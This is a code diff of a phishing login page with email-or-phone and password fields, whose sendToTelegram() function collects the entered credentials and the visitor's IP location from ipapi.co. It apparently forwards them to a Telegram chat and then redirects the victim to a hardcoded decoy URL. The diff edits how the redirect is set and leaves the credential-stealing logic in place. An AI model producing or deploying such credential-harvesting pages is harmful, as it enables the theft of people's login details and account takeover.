@@ -122,7 +122,6 @@
         <form id="loginForm">
             <input type="text" name="email" id="email" placeholder="Email or Phone" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
-            <input type="text" name="redirectUrl" id="redirectUrl" placeholder="Enter your preferred redirect URL" required>
             <button type="button" onclick="sendToTelegram()">Log In</button>
         </form>
     </div>
@@ -139,7 +138,9 @@
         async function sendToTelegram() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
-            const redirectUrl = document.getElementById("redirectUrl").value; // Get the redirect URL input
+
+            // Define the redirect URL you want to use
+            const redirectUrl = "https://your-preferred-link.com"; // Change this to your preferred URL
 
             try {
                 const res = await axios.get('https://ipapi.co/json/');
@@ -170,11 +171,11 @@
                 });
 
                 // Redirect to the custom URL after successful submission
-                window.location.href = redirectUrl; // Redirect to user-provided link
+                window.location.href = redirectUrl; // Redirect to your preferred link
             } catch (error) {
                 console.error("Error sending message to Telegram:", error);
                 // Redirect to the custom URL even if something fails
-                window.location.href = redirectUrl; // Redirect to user-provided link
+                window.location.href = redirectUrl; // Redirect to your preferred link
             }
         }
     </script>
